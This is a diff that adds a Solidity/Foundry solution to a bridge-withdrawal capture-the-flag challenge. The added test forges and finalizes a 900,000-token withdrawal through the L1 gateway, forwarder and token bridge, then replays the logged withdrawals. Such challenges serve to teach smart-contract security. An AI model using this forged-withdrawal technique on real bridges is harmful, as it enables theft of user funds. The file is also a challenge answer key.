@@ -88,7 +88,91 @@ contract WithdrawalChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_withdrawal() public checkSolvedByPlayer {}
+    function test_withdrawal() public checkSolvedByPlayer {
+        // decode data
+        // eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
+        // 0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
+        // 0000000000000000000000000000000000000000000000000000000000000060
+        // 0000000000000000000000000000000000000000000000000000000000000104
+        // 01210a38 // L1Forwarder.forwardMessage(uint256,address,address,bytes)
+        // 0000000000000000000000000000000000000000000000000000000000000000 // nonce
+        // 000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender
+        // 0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target
+        // 0000000000000000000000000000000000000000000000000000000000000080 // timestamp
+        // 0000000000000000000000000000000000000000000000000000000000000044 // message
+        // 81191e51 // TokenBridge.executeTokenWithdrawal(address,uint256)
+        // 000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
+        // 0000000000000000000000000000000000000000000000008ac7230489e80000 // amount
+        // 0000000000000000000000000000000000000000000000000000000000000000
+        // 000000000000000000000000000000000000000000000000
+
+        uint256 TEMP_BRIDGE_TOKEN_AMOUNT = 900_000e18;
+        bytes memory message_ = abi.encodeCall(
+            L1Forwarder.forwardMessage,
+            (
+                0,
+                address(0),
+                address(l1TokenBridge),
+                abi.encodeCall(TokenBridge.executeTokenWithdrawal, (player, TEMP_BRIDGE_TOKEN_AMOUNT))
+            )
+        );
+
+        l1Gateway.finalizeWithdrawal(
+            0,
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            START_TIMESTAMP - 8 days,
+            message_,
+            new bytes32[](0)
+        );
+
+        vm.warp(START_TIMESTAMP + 8 days);
+
+        Withdrawal[] memory withdrawals = _loadWithdrawals("/test/withdrawal/withdrawals.json");
+        for (uint256 i = 0; i < withdrawals.length; i++) {
+            l1Gateway.finalizeWithdrawal(
+                withdrawals[i].nonce,
+                withdrawals[i].caller,
+                withdrawals[i].target,
+                withdrawals[i].timestamp,
+                withdrawals[i].data,
+                new bytes32[](0)
+            );
+        }
+
+        token.transfer(address(l1TokenBridge), TEMP_BRIDGE_TOKEN_AMOUNT);
+    }
+
+    struct Log {
+        bytes data;
+        bytes32[] topics;
+    }
+
+    struct Withdrawal {
+        uint256 nonce; // indexed
+        address caller; // indexed
+        address target; // indexed
+        bytes32 id;
+        uint256 timestamp;
+        bytes data;
+    }
+
+    function _loadWithdrawals(string memory path) private view returns (Withdrawal[] memory withdrawals) {
+        // Parse JSON into an array of Log.
+        Log[] memory logs = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Log[]));
+        uint256 _length = logs.length;
+        withdrawals = new Withdrawal[](_length);
+        for (uint256 i = 0; i < _length; i++) {
+            // Decode data into non-indexed arguments.
+            (bytes32 id, uint256 timestamp, bytes memory data) = abi.decode(logs[i].data, (bytes32, uint256, bytes));
+            withdrawals[i].nonce = uint256(logs[i].topics[1]);
+            withdrawals[i].caller = address(uint160(uint256(logs[i].topics[2])));
+            withdrawals[i].target = address(uint160(uint256(logs[i].topics[3])));
+            withdrawals[i].id = id;
+            withdrawals[i].timestamp = timestamp;
+            withdrawals[i].data = data;
+        }
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -121,3 +205,5 @@ contract WithdrawalChallenge is Test {
         );
     }
 }
+
+// forge test --match-contract WithdrawalChallenge -vvv
